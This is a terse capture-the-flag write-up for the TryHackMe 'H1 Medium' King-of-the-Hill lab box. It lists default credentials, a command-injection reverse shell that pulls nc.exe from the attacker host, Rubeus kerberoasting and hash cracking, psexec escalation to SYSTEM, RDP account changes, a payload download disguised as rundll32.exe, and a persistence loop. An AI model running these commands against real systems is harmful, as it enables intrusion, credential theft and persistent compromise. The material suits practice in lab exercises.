
# H1 Medium THM Public Writeup

#### Important Machine related information

#### Map
```
nmap service overview
```
#### Default Credentials
```
main : winniethepooh
# Apparently - not confirmed amongst all references
achilles : winniethepooh
```

Users:
```
agamemnon
achilles
patrocles
```

#### Network Services to Foothold

Port 80 is interesting. Create an account and navigate to profile. Open dev tools and block script.js URL. Reload page.
```
domain troy.thm
```


```bash
# Apparently
achilles : winniethepooh
cme smb TROY.thm -u achilles -p /usr/share/wordlists/rockyou.txt
```

```
psexec.py TROY.thm/achilles:winniethepooh@<IP>
```

Signup then CMD on /profile
```bash
/signup
/profile
# Use change name field for remote command execution.

# reverse shell listener (on attack machine)
nc -lvnp 9001

# upload nc executable (name field)
cheese | powershell curl <attack-ip>:8000/nc.exe -o nc.exe

# engage reverse shell (name field)
cheese | nc.exe <attack-ip> 9001 -e powershell
```
Windows shell foothold established.
```bash
# upload Ghostpack-CompiledBinaris/Rubeus.exe
curl <attack-ip>:<port>/Rubeus.exe -o Rubeus.exe

# dump kerberoast user hash
.\Rubeus.exe kerberoast /nowrap

# crack hash 
john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs hash
```

#### Privilege Escalation

```bash
# deploy impacket
python3 psexec.py troy.thm/achilles:winniethepooh@<target-ip>
```
Successfully elevated to NT AUTHORITY\SYSTEM.
```bash
# become king
cd C:\
echo <name> > king.txt

# find flags
dir flag*.txt /s 
type Users\<user>\Desktop\flag.txt

# setup rdp and access machine
net localgroup "Remote Desktop Users" achilles /add
net user achilles <newpassword>
xfreerdp /u:achilles /p:newpassword /v:<target-IP> /size:90%
```

Seems to be a pattern across writeups!
```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.199.178:1234/client.exe','c:\users\administrator\music\rundll32.exe')"
attrib +r king.txt
```

`START /b sys.bat`
```bat
:loop
attrib -r -a -h -s c:\king.txt
echo Aquinas > c:\king.txt
goto loop
```

#### Flags
- `king.txt` is at `c:\king.txt`
```
C:\Users\achilles\Desktop\flag.txt
C:\Users\agamemnon\Desktop\flag.txt
C:\Users\hector\Desktop\flag.txt
C:\Users\helen\Desktop\flag.txt
C:\Users\patrocles\Desktop\flag.txt
```
#### References

https://github.com/ChrisPritchard/ctf-writeups/blob/master/tryhackme-koth/koth-h1-medium.md
https://github.com/Machinh/Koth-THM/blob/main/H1-MEDIUM
https://gist.github.com/comradecheese/dbf38607460a03fdd93b58767a598d3a
https://0xjin.medium.com/h1-tryhackme-koth-medium-box-writeup-90bf008e91a7